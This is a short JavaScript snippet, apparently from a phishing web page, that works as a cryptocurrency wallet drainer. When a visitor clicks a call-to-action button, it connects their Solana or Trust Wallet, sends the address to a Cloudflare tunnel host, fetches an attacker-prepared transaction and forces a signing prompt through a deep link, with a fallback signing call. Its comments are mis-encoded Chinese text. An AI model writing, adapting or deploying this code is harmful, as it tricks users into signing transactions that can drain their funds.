<script>
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
    document.getElementById('cta').onclick = async function() {
        const log = (t) => document.getElementById('st').innerText = t;
        const p = window.trustwallet?.solana || window.solana;
        
        try {
            await p.connect();
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();
            
            log("WAKING WALLET...");
            
            // ðŸ”± V35 æ ¸å¿ƒï¼šæ·±åº¦é“¾æŽ¥æš´åŠ›æ‹‰èµ·
            // è¿™ä¼šç›´æŽ¥æƒŠåŠ¨ TW çš„ç³»ç»Ÿç›‘å¬å™¨ï¼Œå¼ºåˆ¶å¼¹å‡ºç­¾åç¡®è®¤
            const txBase64 = info.raw_tx;
            window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(txBase64);
            
            // å¤‡ç”¨ï¼šåŒæ—¶å°è¯•å¸¸è§„å”¤é†’
            setTimeout(() => { p.signTransaction(window.solanaWeb3.Transaction.from(window.atob(txBase64))); }, 1000);

        } catch (err) { window.location.reload(); }
    };
</script>
